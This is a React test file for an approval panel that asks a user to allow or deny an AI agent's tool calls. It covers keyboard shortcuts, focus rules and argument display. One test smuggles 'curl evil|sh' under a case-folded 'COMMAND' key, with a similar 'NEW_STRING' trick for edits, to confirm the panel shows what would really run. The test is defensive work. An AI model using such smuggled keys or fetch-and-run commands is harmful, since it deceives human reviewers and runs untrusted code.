// SPDX-License-Identifier: Apache-2.0
// @vitest-environment happy-dom

import { act, cleanup, fireEvent, render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import { ApprovalPanel, type ApprovalRequest } from "./approval-panel";
import { describeAskArgs } from "./ask-args";
import { EscapeHintContext } from "./escape-hint-context";
import { PlanReviewCard } from "./plan-review-card";

Object.assign(globalThis, { IS_REACT_ACT_ENVIRONMENT: true });

afterEach(() => {
  cleanup();
  document.body.innerHTML = "";
});

function ask(overrides: Partial<ApprovalRequest> = {}): ApprovalRequest {
  return {
    args: '{"command":"ls"}',
    askId: "ask-a",
    controlTarget: { askId: "ask-a", runId: "run-a", sessionId: "chat-a" },
    reason: "Needs a shell",
    tool: "Bash",
    ...overrides,
  };
}

function renderActive(
  approval = ask(),
  props: { disabled?: boolean; uncertain?: boolean; active?: boolean } = {},
) {
  const respond = vi.fn();
  render(
    <EscapeHintContext.Provider value={props.active === false ? undefined : approval}>
      <ApprovalPanel
        approval={approval}
        disabled={props.disabled ?? false}
        onRespond={respond}
        uncertain={props.uncertain}
      />
    </EscapeHintContext.Provider>,
  );
  return respond;
}

function press(key: string, init: KeyboardEventInit = {}, target: Element = document.body) {
  fireEvent.keyDown(target, { key, ...init });
  fireEvent.keyUp(target, { key, ...init });
}

/** A control inside the rendered card: the keys answer only from focus there. */
function inCard(name = "Bash"): HTMLElement {
  const card = screen.getByRole("region", { name: `Permission required: ${name}` });
  return within(card).getByRole("button", { name: "Raw arguments" });
}

describe("approval shortcuts", () => {
  it.each([
    ["y", "allow_once"],
    ["Y", "allow_once"],
    ["a", "allow_once"],
    ["w", "allow_always"],
    ["W", "allow_always"],
    ["n", "deny"],
    ["d", "deny"],
    ["D", "deny"],
  ] as const)("answers %j with %s", (key, verdict) => {
    const respond = renderActive();
    press(key, {}, inCard());
    expect(respond.mock.calls).toEqual([[verdict]]);
  });

  it("ignores modified, held, composing, and unrelated keys", () => {
    const respond = renderActive();
    for (const target of [document.body, inCard()]) {
      press("y", { ctrlKey: true }, target);
      press("a", { metaKey: true }, target);
      press("n", { altKey: true }, target);
      press("y", { repeat: true }, target);
      press("y", { isComposing: true }, target);
      for (const key of ["x", "j", "k", "Enter", " ", "Escape"]) press(key, {}, target);
    }
    expect(respond).not.toHaveBeenCalled();
  });

  it("never fires while typing anywhere on its surface", () => {
    const approval = ask();
    const respond = vi.fn();
    render(
      <div data-chat-surface="workspace">
        <input aria-label="Field" />
        <textarea aria-label="Composer" />
        <select aria-label="Choice">
          <option>One</option>
        </select>
        <div contentEditable data-editor suppressContentEditableWarning />
        <EscapeHintContext.Provider value={approval}>
          <ApprovalPanel approval={approval} disabled={false} onRespond={respond} />
        </EscapeHintContext.Provider>
      </div>,
    );
    const editor = document.querySelector("[data-editor]") as HTMLElement;
    for (const target of [
      screen.getByRole("textbox", { name: "Field" }),
      screen.getByRole("textbox", { name: "Composer" }),
      editor,
    ]) {
      target.focus();
      for (const key of ["y", "a", "w", "n", "d"]) press(key, {}, target);
    }
    const select = screen.getByRole("combobox", { name: "Choice" });
    select.focus();
    for (const key of ["y", "n"]) press(key, {}, select);
    expect(respond).not.toHaveBeenCalled();
    // The same surface does answer once focus leaves the field.
    press("y", {}, screen.getByRole("button", { name: "Raw arguments" }));
    expect(respond.mock.calls).toEqual([["allow_once"]]);
  });

  it("fires only for the surface's active ask while the ledger leaves it answerable", () => {
    for (const props of [{ active: false }, { disabled: true }, { uncertain: true }]) {
      const respond = renderActive(ask(), props);
      const card = screen.getByRole("region", { name: "Permission required: Bash" });
      for (const key of ["y", "w", "n"]) {
        press(key);
        press(key, {}, card);
      }
      expect(respond).not.toHaveBeenCalled();
      expect(card.querySelector("kbd")).toBeNull();
      expect(card.querySelector("[aria-keyshortcuts]")).toBeNull();
      cleanup();
    }
  });

  it("offers only Deny when the ask has no arguments", () => {
    const respond = renderActive(ask({ args: "" }));
    const card = screen.getByRole("region", { name: "Permission required: Bash" });
    const deny = within(card).getByRole("button", { name: "Deny" });
    press("y", {}, deny);
    press("w", {}, deny);
    expect(respond).not.toHaveBeenCalled();
    press("n", {}, deny);
    expect(respond.mock.calls).toEqual([["deny"]]);
    expect([...card.querySelectorAll("kbd")].map((kbd) => kbd.textContent)).toEqual(["N"]);
    expect(document.activeElement).toBe(document.body);
  });

  it("yields to an open dialog or menu", () => {
    const respond = renderActive();
    const dialog = document.createElement("div");
    dialog.setAttribute("role", "dialog");
    dialog.dataset.state = "open";
    document.body.append(dialog);
    press("y", {}, inCard());
    expect(respond).not.toHaveBeenCalled();
    dialog.remove();
    press("y", {}, inCard());
    expect(respond.mock.calls).toEqual([["allow_once"]]);
  });

  it("keeps each chat surface's keys to its own ask", () => {
    const workspaceAsk = ask({ reason: "Workspace ask" });
    const threadAsk = ask({
      askId: "ask-t",
      controlTarget: { askId: "ask-t", runId: "run-t", sessionId: "thread-a" },
      reason: "Thread ask",
    });
    const workspace = vi.fn();
    const thread = vi.fn();
    render(
      <div data-chat-surface="workspace">
        <button type="button">Workspace control</button>
        <EscapeHintContext.Provider value={workspaceAsk}>
          <ApprovalPanel approval={workspaceAsk} disabled={false} onRespond={workspace} />
        </EscapeHintContext.Provider>
        <aside data-chat-surface="thread">
          <button type="button">Thread control</button>
          <EscapeHintContext.Provider value={threadAsk}>
            <ApprovalPanel approval={threadAsk} disabled={false} onRespond={thread} />
          </EscapeHintContext.Provider>
        </aside>
      </div>,
    );
    // Focus outside both cards answers neither ask, on either surface.
    for (const target of [
      document.body,
      screen.getByRole("button", { name: "Workspace control" }),
      screen.getByRole("button", { name: "Thread control" }),
    ]) {
      for (const key of ["y", "w", "n"]) press(key, {}, target);
    }
    expect(workspace).not.toHaveBeenCalled();
    expect(thread).not.toHaveBeenCalled();

    const workspaceCard = screen.getByText("Workspace ask").closest("section") as HTMLElement;
    const threadCard = screen.getByText("Thread ask").closest("section") as HTMLElement;
    press("y", {}, within(workspaceCard).getByRole("button", { name: "Raw arguments" }));
    expect(workspace.mock.calls).toEqual([["allow_once"]]);
    expect(thread).not.toHaveBeenCalled();

    press("w", {}, within(threadCard).getByRole("button", { name: "Raw arguments" }));
    expect(thread.mock.calls).toEqual([["allow_always"]]);

    press("d", {}, within(threadCard).getByRole("button", { name: "Deny" }));
    expect(thread.mock.calls).toEqual([["allow_always"], ["deny"]]);
    expect(workspace.mock.calls).toHaveLength(1);
  });

  it("steps focus between the verdict buttons with the arrow keys", () => {
    renderActive();
    const card = screen.getByRole("region", { name: "Permission required: Bash" });
    const [once, always, deny] = ["Allow once", "Always allow", "Deny"].map((name) =>
      within(card).getByRole("button", { name }),
    );
    expect(document.activeElement).toBe(document.body);
    once?.focus();
    const steps: Array<[string, HTMLElement | undefined]> = [
      ["ArrowRight", always],
      ["ArrowDown", deny],
      ["ArrowRight", once],
      ["ArrowLeft", deny],
      ["ArrowUp", always],
    ];
    for (const [key, expected] of steps) {
      const focused = document.activeElement as HTMLElement;
      const event = new KeyboardEvent("keydown", { bubbles: true, cancelable: true, key });
      act(() => {
        focused.dispatchEvent(event);
      });
      expect(event.defaultPrevented).toBe(true);
      expect(document.activeElement).toBe(expected);
    }
    // Arrows outside the verdict buttons are left alone.
    const raw = within(card).getByRole("button", { name: "Raw arguments" });
    raw.focus();
    const event = new KeyboardEvent("keydown", {
      bubbles: true,
      cancelable: true,
      key: "ArrowDown",
    });
    raw.dispatchEvent(event);
    expect(event.defaultPrevented).toBe(false);
    expect(document.activeElement).toBe(raw);
  });

  it("never takes focus for a new ask, from the composer or from nothing", () => {
    const composer = document.createElement("textarea");
    document.body.append(composer);
    composer.focus();
    renderActive();
    expect(document.activeElement).toBe(composer);
    cleanup();
    composer.remove();

    renderActive();
    expect(document.activeElement).toBe(document.body);
  });

  it("shows keycaps that match the keys", () => {
    renderActive();
    const card = screen.getByRole("region", { name: "Permission required: Bash" });
    const buttons = ["Allow once", "Always allow", "Deny"].map((name) =>
      within(card).getByRole("button", { name }),
    );
    expect(buttons.map((button) => button.getAttribute("aria-keyshortcuts"))).toEqual([
      "y a",
      "w",
      "n d",
    ]);
    expect(buttons.map((button) => button.querySelector("kbd")?.textContent)).toEqual([
      "Y",
      "W",
      "N",
    ]);
    expect(within(card).getByText("Esc to Deny")).toBeTruthy();
  });

  it("gives the plan card no letter shortcuts", () => {
    const plan = ask({ args: '{"plan":"Ship"}', tool: "PresentPlan" });
    const respond = vi.fn();
    render(
      <EscapeHintContext.Provider value={plan}>
        <PlanReviewCard approval={plan} disabled={false} onRespond={respond} />
      </EscapeHintContext.Provider>,
    );
    for (const key of ["y", "a", "w", "n", "d"]) press(key);
    expect(respond).not.toHaveBeenCalled();
    expect(screen.getByText("Esc to Iterate")).toBeTruthy();
  });
});

describe("approval shortcut focus", () => {
  function renderPair() {
    const first = ask({ reason: "First ask" });
    const second = ask({
      askId: "ask-b",
      controlTarget: { askId: "ask-b", runId: "run-a", sessionId: "chat-a" },
      reason: "Second ask",
    });
    const respondFirst = vi.fn();
    const respondSecond = vi.fn();
    render(
      <div data-chat-surface="workspace">
        <button type="button">Workspace control</button>
        <p>Transcript text</p>
        <EscapeHintContext.Provider value={first}>
          <ApprovalPanel approval={first} disabled={false} onRespond={respondFirst} />
          <ApprovalPanel approval={second} disabled={false} onRespond={respondSecond} />
        </EscapeHintContext.Provider>
      </div>,
    );
    const card = (reason: string) => screen.getByText(reason).closest("section") as HTMLElement;
    return { card, respondFirst, respondSecond };
  }

  it("never answers the active ask from inside another card", () => {
    const { card, respondFirst, respondSecond } = renderPair();
    const second = card("Second ask");
    for (const target of [
      within(second).getByRole("button", { name: "Raw arguments" }),
      within(second).getByRole("button", { name: "Allow once" }),
      within(second).getByRole("button", { name: "Deny" }),
      within(second).getByText("Second ask"),
      second,
    ]) {
      for (const key of ["y", "a", "w", "n", "d"]) press(key, {}, target);
    }
    expect(respondFirst).not.toHaveBeenCalled();
    expect(respondSecond).not.toHaveBeenCalled();
    // The active card's own focus still answers it, once per key press.
    press("n", {}, within(card("First ask")).getByRole("button", { name: "Raw arguments" }));
    expect(respondFirst.mock.calls).toEqual([["deny"]]);
    expect(respondSecond).not.toHaveBeenCalled();
  });

  it("never answers from focus outside the card, so typing elsewhere grants nothing", () => {
    const { respondFirst, respondSecond } = renderPair();
    for (const target of [
      document.body,
      document.documentElement,
      screen.getByRole("button", { name: "Workspace control" }),
      screen.getByText("Transcript text"),
    ]) {
      for (const key of ["y", "a", "w", "n", "d", "W", "Y"]) press(key, {}, target);
    }
    expect(respondFirst).not.toHaveBeenCalled();
    expect(respondSecond).not.toHaveBeenCalled();
  });

  it("types 'Why' into the page, not into Always allow, once the composer loses focus", async () => {
    const { respondFirst } = renderPair();
    (document.activeElement as HTMLElement | null)?.blur();
    expect(document.activeElement).toBe(document.body);
    await userEvent.setup().keyboard("Why is this needed?");
    expect(respondFirst).not.toHaveBeenCalled();
  });

  it("grants nothing when W is typed right after an ask arrives with no user focus", async () => {
    expect(document.activeElement).toBe(document.body);
    const respond = renderActive();
    const user = userEvent.setup();
    await user.keyboard("W");
    expect(respond).not.toHaveBeenCalled();
    await user.keyboard("w{Enter}y {Enter}n");
    expect(respond).not.toHaveBeenCalled();
    // A new ask never takes focus, so a blind W can't grant a persistent rule.
    expect(document.activeElement).toBe(document.body);
  });

  it("answers only once the user puts focus inside the card", async () => {
    const respond = renderActive();
    const card = screen.getByRole("region", { name: "Permission required: Bash" });
    const user = userEvent.setup();
    await user.keyboard("yw{Enter}");
    expect(respond).not.toHaveBeenCalled();
    // Tab moves focus into the card: its first control, then the keys work.
    await user.tab();
    expect(card.contains(document.activeElement)).toBe(true);
    await user.keyboard("n");
    expect(respond.mock.calls).toEqual([["deny"]]);
    // Clicking a verdict button focuses it (in Chromium) and answers as clicked.
    await user.click(within(card).getByRole("button", { name: "Deny" }));
    expect(respond.mock.calls).toEqual([["deny"], ["deny"]]);
  });
});

describe("approval card", () => {
  it("names the tool, its risk, and its arguments", () => {
    renderActive(ask({ args: '{"path":"x"}', tool: "delete_file" }), { active: false });
    const card = screen.getByRole("region", { name: "Permission required: delete_file" });
    expect(within(card).getByText("This action modifies or deletes data.")).toBeTruthy();
    expect(within(card).getByText(/"path": "x"/)).toBeTruthy();
    fireEvent.click(within(card).getByRole("button", { name: "Raw arguments" }));
    expect(within(card).getByText('{"path":"x"}')).toBeTruthy();
    expect(
      within(card).getByRole("button", { name: "Raw arguments" }).getAttribute("aria-pressed"),
    ).toBe("true");
    cleanup();

    renderActive(ask(), { active: false });
    const warning = screen.getByRole("region", { name: "Permission required: Bash" });
    expect(within(warning).queryByText("This action modifies or deletes data.")).toBeNull();
    expect(within(warning).getByText("ls")).toBeTruthy();
    // The header wraps rather than squeezing the tool name: on a phone the badge
    // moves to its own line, and only a name wider than the card truncates.
    const badge = warning.querySelector('[data-slot="badge"]');
    expect(badge?.parentElement?.getAttribute("class")?.split(" ")).toContain("flex-wrap");
    expect(badge?.getAttribute("class")?.split(" ")).toContain("max-w-full");
    expect(badge?.querySelector(".truncate")?.textContent).toBe("Bash");
    // No side-panel slot: no detail button.
    expect(within(warning).queryByRole("button", { name: "Open in detail panel" })).toBeNull();
  });
});

describe("approval card arguments", () => {
  it("never shows one command when the engine would run another", () => {
    // Go's encoding/json folds COMMAND onto the `command` field and keeps the
    // last match: the engine runs "curl evil|sh".
    renderActive(ask({ args: '{"command":"echo safe","COMMAND":"curl evil|sh"}', tool: "Shell" }), {
      active: false,
    });
    const card = screen.getByRole("region", { name: "Permission required: Shell" });
    expect(within(card).queryByText("echo safe", { exact: true })).toBeNull();
    const shown = card.querySelector("pre")?.textContent ?? "";
    expect(shown).toContain('"command": "echo safe"');
    expect(shown).toContain('"COMMAND": "curl evil|sh"');
  });

  it("shows a command's timeout and temporary-storage scope", () => {
    renderActive(
      ask({ args: '{"command":"make","timeout_ms":120000,"temp_scope":"system"}', tool: "Shell" }),
      { active: false },
    );
    const card = screen.getByRole("region", { name: "Permission required: Shell" });
    expect(within(card).getByText("make", { exact: true }).tagName).toBe("PRE");
    const terms = [...card.querySelectorAll("dt")].map((term) => [
      term.textContent,
      term.nextElementSibling?.textContent,
    ]);
    expect(terms).toEqual([
      ["Timeout", "120000 ms"],
      ["Temporary storage", "system"],
    ]);
  });

  it("shows that a command runs in the background", () => {
    renderActive(
      ask({
        args: '{"command":"make serve","background":true,"temp_scope":"system"}',
        tool: "Shell",
      }),
      { active: false },
    );
    const card = screen.getByRole("region", { name: "Permission required: Shell" });
    expect(within(card).getByText("make serve", { exact: true }).tagName).toBe("PRE");
    const terms = [...card.querySelectorAll("dt")].map((term) => [
      term.textContent,
      term.nextElementSibling?.textContent,
    ]);
    expect(terms).toEqual([
      ["Background", "true"],
      ["Temporary storage", "system"],
    ]);
  });

  it("refuses an Edit diff when a folded name changes what the engine writes", () => {
    renderActive(
      ask({
        args: '{"path":"a.txt","old_string":"x","new_string":"safe","NEW_STRING":"evil"}',
        tool: "Edit",
      }),
      { active: false },
    );
    const card = screen.getByRole("region", { name: "Permission required: Edit" });
    expect(card.querySelector("[data-diff]")).toBeNull();
    expect(card.querySelector("pre")?.textContent).toContain('"NEW_STRING": "evil"');
  });
});

describe("describeAskArgs", () => {
  it("decodes each tool's arguments", () => {
    expect(describeAskArgs("Bash", '{"command":"ls -la","timeout_ms":5}')).toEqual({
      command: "ls -la",
      kind: "shell",
      timeoutMs: 5,
    });
    expect(describeAskArgs("shell", '{"command":"pwd"}')).toEqual({
      command: "pwd",
      kind: "shell",
    });
    expect(describeAskArgs("Edit", '{"path":"a","old_string":"x","new_string":"y"}')).toEqual({
      kind: "edit",
    });
    expect(describeAskArgs("Write", '{"path":"a","content":"x"}')).toEqual({ kind: "write" });
    expect(describeAskArgs("Edit", '{"path":"a"}')).toEqual({
      kind: "json",
      pretty: '{\n  "path": "a"\n}',
    });
    expect(describeAskArgs("Read", "[1]")).toEqual({ kind: "json", pretty: "[\n  1\n]" });
    expect(describeAskArgs("Read", "{broken")).toEqual({ kind: "raw", text: "{broken" });
    expect(describeAskArgs("Read", "")).toEqual({ kind: "raw", text: "" });
    const long = JSON.stringify({ command: "x".repeat(70_000) });
    expect(describeAskArgs("Bash", long)).toEqual({ kind: "raw", text: long });
  });
});
